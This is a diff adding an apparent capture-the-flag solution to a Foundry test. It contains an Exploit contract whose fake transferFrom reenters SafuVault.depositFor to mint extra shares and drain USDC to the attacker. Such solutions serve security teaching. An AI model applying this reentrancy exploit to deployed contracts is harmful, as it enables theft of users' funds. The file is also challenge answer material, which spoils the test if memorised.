@@ -66,7 +66,23 @@ contract Testing is Test {
         vm.startPrank(attacker,attacker);
 
         // implement solution here
+        console.log("balance usdc of safuvault :", usdc.balanceOf(address(safuVault)));
+        console.log("balance shares of adminUser :", safuVault.balanceOf(address(adminUser)));
+        console.log("balance usdc of attacker :", usdc.balanceOf(address(attacker)));
 
+        //Reentrancy inside sauVault due to the function depositFor
+        //We can choose the token address for the call safeTransferFrom
+        Exploit _exploit = new Exploit();  
+        usdc.transfer(address(_exploit),usdc.balanceOf(address(attacker)));
+        _exploit.pwn(address(safuVault),address(usdc));
+
+        console.log("total shares :", safuVault.totalSupply());
+        console.log("balance shares of attacker :", safuVault.balanceOf(address(attacker)));
+        console.log("balance usdc of exploit :", usdc.balanceOf(address(_exploit)));
+
+        safuVault.withdrawAll();
+        console.log("balance usdc of attacker :", usdc.balanceOf(address(attacker)));
+        
         vm.stopPrank();
         validation();
     }
@@ -80,5 +96,58 @@ contract Testing is Test {
         assertGe(usdc.balanceOf(attacker),19_000e18);
 
     }
+
+}
+
+contract Exploit {
+
+    uint256 reentrancy_count;
+    uint count;
+    uint amount;
+    Token usdc;
+    SafuVault safuVault;
+    address owner;
+
+    constructor (){}   
+    
+
+    function transferFrom(
+        address from,
+        address to,
+        uint256 _amount
+    ) public  returns (bool) {
+
+        if(count < reentrancy_count){ //reentrancy_count condition
+            count++;
+            safuVault.depositFor(address(this),uint256(0),owner); //Here is the reentrancy
+            usdc.transfer(address(safuVault),amount); //increase value _after of depositFor()
+            /*
+            Scheme example:
+            _pool 10_000
+                _pool 10_000
+                    _pool 10_000
+                        _pool 10_000
+                            _pool 10_000  
+                            _after 10_100 -> amount = 100
+                        _after 10_200 -> amount = 200
+                    _after 10_300 -> amount = 300
+                _after 10_400 -> amount = 400
+            _after 10_500 -> amount = 500    
+            */
+        }
+        return true;
+    }
+
+    //Reentrancy via the function depositFor of the SafuVault contract
+    //We will mint more shares that we supposed to be due to the reentrancy
+    function pwn(address _target, address _usdc) external {
+        owner=msg.sender;
+        usdc=Token(_usdc);
+        safuVault=SafuVault(_target);
+        reentrancy_count= (usdc.balanceOf(address(this))/100 ether); // Number of times we will reenter = 100 times
+        amount = usdc.balanceOf(address(this))/reentrancy_count ; // amount to deposit per reentrancy
+        safuVault.depositFor(address(this),uint256(0),msg.sender); //Begin of the reentrancy
+    }
+
 
 }
